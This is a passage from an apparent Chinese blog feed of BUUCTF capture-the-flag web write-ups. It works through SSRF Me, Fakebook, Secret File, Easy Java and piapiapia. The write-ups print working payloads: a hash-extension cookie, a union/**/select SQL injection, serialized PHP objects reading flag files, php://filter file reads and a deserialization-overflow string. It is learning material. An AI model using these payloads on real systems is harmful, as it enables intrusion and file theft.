text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read; sign=97e65e9f2b787e7da361b36819f4858f</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212202311.png" alt=""></p><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>这个解是由于在处理<code>md5(secret_key+param+action)</code>时的字符串拼接问题</p><p>在上一步中，要满足以下条件：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">md5(<span class="name">secret_key+param+</span><span class="string">"scan"</span>)=md5(<span class="name">secret_key+param_new+</span><span class="string">"readscan"</span>)</span><br></pre></td></tr></table></figure><p>这样是不是很明显了?</p><p>如果说我们把<code>param</code>设置为<code>flag.txtread</code></p><p>则生成的哈希值为：<code>md5(secret_key+&quot;flagreadscan&quot;)</code></p><p>而<code>param_new</code>设置为<code>flag.txt</code>，此时哈希为：<code>md5(secret_key+&quot;flagreadscan&quot;)</code></p><p>两者不就一致了？</p><p>做到这的时候容器过期了，重启了一下，可能哈希值和哈希扩展攻击做出来的不太一致，不影响Hhhh</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212203705.png" alt=""></p><p>得到<code>sign</code>为1fe174259868982589f0721388fe2ab6</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212204209.png" alt=""></p><p>最后安装流程把<code>action</code>设置为<code>readscan</code>,sign设置为刚才生成的哈希值，即通过校验，得到<code>flag</code></p><h2 id="local-file（天枢巨佬）"><a href="#local-file（天枢巨佬）" class="headerlink" title="local_file（天枢巨佬）"></a>local_file（天枢巨佬）</h2><p>这个思路大致方法和上面的字符串拼接的一致</p><p>但区别在于使用了<code>local_file:///app/flag.txt</code>来代替了字符串拼接中的<code>flag.txt</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>主要是这道题使用了<code>urllib.urlopen(param)</code>来读取文件，所以可以不必使用<code>file:///app/flag.txt</code>来读取文件，这里由于<code>file</code>被过滤，所以使用<code>local_file</code>代替</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212205428.png" alt=""></p><p><a href="https://bugs.python.org/issue35907" target="_blank" rel="noopener">https://bugs.python.org/issue35907</a></p><p>但如果使用了<code>urllib2.urlopen(param)</code>来读取文件，则必须加上<code>flie</code>或者<code>local_file</code></p><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><h2 id="预期SSRF解"><a href="#预期SSRF解" class="headerlink" title="预期SSRF解"></a>预期SSRF解</h2><p>由于<code>BUUCTF</code>先知访问频率，这里扫目录的时候需要给点延时</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213214757.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213163921.png" alt=""></p><p>查看<code>robots.txt</code>看到个<code>user.php.bak</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到对<code>blog</code>进行了严格过滤，所以注册的时候写<code>file:///var/www/html/flag.php</code>是不行的</p><p>但这里看到对<code>name、age、blog</code>进行了序列化操作，然后结合上面反序列化操作，推测应该存在先将序列化写入数据库然后然序列化读出来的操作<br>进去先随便注册一个账号</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213164131.png" alt=""></p><p>这里由于<code>BUUCTF</code>不能访问外网，所以下面的<code>contnets</code>为空，但推测应该为<code>SSRF</code>,同时看到<code>GET</code>参数<code>no</code>，可能会存在注入点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213164306.png" alt=""></p><p>可以看到存在注入点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213164341.png" alt=""></p><p><code>order by</code>探测到一共有4列</p><p>这里由于直接过滤了<code>union select</code>,需要<code>union/**/select</code>绕过</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213164645.png" alt=""></p><p>然后找到回显点在第二列</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213173021.png" alt=""></p><p>然后读到表名</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213173230.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213173313.png" alt=""></p><p>然后读<code>data</code>的内容</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213174545.png" alt=""></p><p>这样的话，我们可以结合反序列化生成读取<code>flag.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name = <span class="string">"a2u13"</span>;</span><br><span class="line"><span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> $blog = <span class="string">"file:///var/www/html/flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UserInfo();</span><br><span class="line">$payload = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:8</span><span class="selector-pseudo">:"UserInfo"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"a2u13"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"age"</span>;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"blog"</span>;<span class="attribute">s</span>:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>这里需要对反序列化结果用单引号包裹，否则会报错</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">http://431aebdc-f2f9-<span class="number">4e74</span>-9eaa-25f4335ed44c.node3.buuoj.cn/<span class="built_in">view</span>.php?no=-<span class="number">1</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,'O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"a2u13"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"blog"</span>;s:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;'</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213175355.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213175607.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213175626.png" alt=""></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这里由于没有过滤<code>load_file</code>函数，导致可以直接读取到<code>flag.php</code></p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://<span class="number">431</span>aebdc-f2f9<span class="number">-4e74</span><span class="number">-9</span>eaa<span class="number">-25</span>f4335ed44c.node3.buuoj.cn/<span class="keyword">view</span>.php?<span class="keyword">no</span>=<span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,load_file("/var/www/html/flag.php"),<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213175956.png" alt=""></p><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213145539.png" alt=""></p><p>只看看网页源代码看到一个超链接</p><p>点进去看到这个界面，点一下<code>SECRET</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213145735.png" alt=""></p><p>这里由于存在<code>302</code>跳转，所以得用<code>BurpSuite</code>来拦截<code>Response</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213145720.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213145858.png" alt=""></p><p>访问可以看到源代码和提示，这里直接<code>include(flag.php)</code>的话，会提示被隐藏了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213145945.png" alt=""></p><p>这里直接用<code>php://filter</code>读即可</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">/secr3t.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213150033.png" alt=""></p><p><code>base64</code>解码即可得到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213150123.png" alt=""></p><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213183748.png" alt=""></p><p>猜测账号为<code>admin</code>，密码爆破一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213183728.png" alt=""></p><p>得到密码<code>admin888</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213183850.png" alt=""></p><p>进去这个玩意，逗我呢</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213183947.png" alt=""></p><p>回到登录界面有个<code>help</code>，打开发现这个玩意，推测应该有文件包含之类的漏洞</p><p>接下来的我一点都不会。。。</p><p>按照别人的<code>WriteUp</code>，这里需要找到一个<strong><code>WEB-INF/web.xml</code></strong>文件</p><p><a href="https://blog.csdn.net/qq_36869808/article/details/89086853" target="_blank" rel="noopener">WEB-INF/web.xml泄露总结</a></p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure><p>这里如果把文件名以<code>GET</code>方式传过去会报错，但改成<code>POST</code>的方式传过去就没问题，也不知道啥原因</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213184709.png" alt=""></p><p>这里根据上面<code>WEB-INF</code>介绍，在<code>classes</code>文件夹内找到<code>FlagController.class</code>读取、</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213185132.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213185157.png" alt=""></p><p><code>base64</code>解码得到<code>flag</code></p><p>这道题我其实不懂原理啥的，因为没写过<code>Java</code>的项目，不知道配置文件泄露的问题和<code>class</code>文件泄露反编译等，这道题就当长长见识吧</p><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p>先扫目录，扫到上传目录以及一个网站源码压缩包<code>www.zip</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213190405.png" alt=""></p><p>在<code>config.php</code>中看到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213193948.png" alt=""></p><p>同时在<code>profile.php</code>文件中看到反序列化操作和文件读取操作</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213194032.png" alt=""></p><p>这样的话，只要我们可以控制<code>$profile[&#39;photo&#39;]</code>的值为<code>config.php</code>的话，就可以读到<code>flag</code>了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213194156.png" alt=""></p><p>代码流程总体很简单：</p><ol><li>在<code>register.php</code>中注册信息</li><li>在<code>update.php</code>中修改自己的信息</li><li>后在<code>profile.php</code>中查看自己修改的信息</li></ol><p>其中<code>$profile</code>来自于<code>show_profile($_SESSION[&#39;username&#39;])</code></p><p>看一下<code>update</code>环节</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213202626.png" alt=""></p><p>看一下<code>update_profile</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">  $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">  $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">  $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及<code>update</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">  $sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">  <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在一个问题，由于在序列化的操作中，如果正常按流程序列化</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213203641.png" alt=""></p><p>后面的<code>photo</code>那一块肯定会包括<code>&#39;upload/&#39; . md5($file[&#39;name&#39;])</code>这一串，而我们这要求<code>photo</code>为<code>config.php</code></p><p>这样的话，只能从前面的<code>nickname</code>那一块下手，把<code>nickname</code>后面的那一块覆盖为<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213204645.png" alt=""></p><p>从而后面的真正传进来的<code>photo</code>被反序列化忽略</p><p>要想实现这个过程，要经过三个过滤：</p><p><strong>第一个过滤：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure><p>可以通过数组绕过</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">nickname[]</span>=</span><br></pre></td></tr></table></figure><p><strong>第二个过滤：</strong></p><p><code>update</code>过程中的过滤</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213204155.png" alt=""></p><p><strong>第三个过滤：</strong>：</p><p><code>profile</code>过程中的过滤：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213204302.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">  $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">  $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">  $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">  $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">  $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重点在于<code>filter</code>来把后面的<code>s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;}</code>那一串挤出去，让<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>被反序列化</p><p>我看了好久才明白具体原理</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213212858.png" alt=""></p><p>由于我们传入的<code>nickname</code>为数组，这里序列化后会产生<code>s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;123&quot;;}</code></p><p>所以我们要传入的<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>需要把数组产生的<code>}</code>给闭合了</p><p>这样的话，我们实际传入的为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>长度为34</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213213048.png" alt=""></p><p>然后我们需要传入<code>where</code>，被<code>filter</code>给替换成<code>hacker</code>，这样的话，长度增加一位</p><p>比如说我们传入下面<code>nickname</code>值后，由34个<code>where</code>和34位长度的<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>组成，这样的话，长度一共为<code>34*5+34=204</code></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>此时的序列化结果应该为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">3</span>:<span class="string">"123"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">9</span>:<span class="string">"qq@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:39:"</span>upload/<span class="number">112</span>ee671410cfddb989525527d73ee82<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213214310.png" alt=""></p><p>而在经过<code>filter</code>替换后，<code>where</code>变成<code>hacker</code>，长度由<code>34*5+34=204</code>变成<code>34*6+34=204+34</code></p><p>增加的34个字符刚好把原先的<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>给代替了，此时由于<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>闭合数组的<code>}</code>，从而不再算在<code>nickname</code>的值当中，变成了独立的被反序列化点</p><p>此时的反序列化结果应该为：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213214226.png" alt=""></p><p>这样就导致了反序列化的溢出</p><p>把后面的<code>s:5:&quot;photo&quot;;s:39:&quot;upload/112ee671410cfddb989525527d73ee82&quot;;}</code>给抛弃了</p><p>然后在<code>updatae</code>处抓包，修改一下<code>nickname</code>为<code>nickname[]</code>即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213214513.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213214556.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213214622.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目列表：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[CISCN2019 华北赛区 Day2 Web1]Hack World&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]Havefun&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]EasySQL&lt;/li&gt;
&lt;li&gt;[De1CTF 2019]SSRF Me&lt;/li&gt;
&lt;li&gt;[网鼎杯 2018]Fakebook&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]Secret File&lt;/li&gt;
&lt;li&gt;[RoarCTF 2019]Easy Java&lt;/li&gt;
&lt;li&gt;[0CTF 2016]piapiapia&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://a2u13.com/categories/CTF/"/>
    
    
      <category term="BUUCTF" scheme="https://a2u13.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题笔记（一）</title>
    <link href="https://a2u13.com/2020/02/12/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/12/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-02-12T08:08:46.000Z</published>
    <updated>2020-06-07T06:28:29.013Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p><p><strong>题目列表：</strong></p><ul><li>[HCTF 2018]WarmUp</li><li>[强网杯 2019]随便注</li><li>[护网杯 2018]easy_tornado</li><li>[SUCTF 2019]EasySQL</li><li>[HCTF 2018]admin</li><li>[强网杯 2019]高明的黑客</li><li>[RoarCTF 2019]Easy Calc</li><li>[SUCTF 2019]CheckIn</li></ul><a id="more"></a><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>放假不开学在家没事干，闲着也是闲着，不如一起来刷题~<br>题目全部来自于<a href="https://buuoj.cn/" target="_blank" rel="noopener">BUUCTF</a>，在此十分感谢赵师傅~<br>刷题笔记会差不多每八个题为一篇<br>每一道题我都会写详细过程和知识点，让自己能够在学习中进步，Hhhhhh</p><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>打开就是一个大滑稽脸，这里查看源代码可以看到注释</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207202744.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = 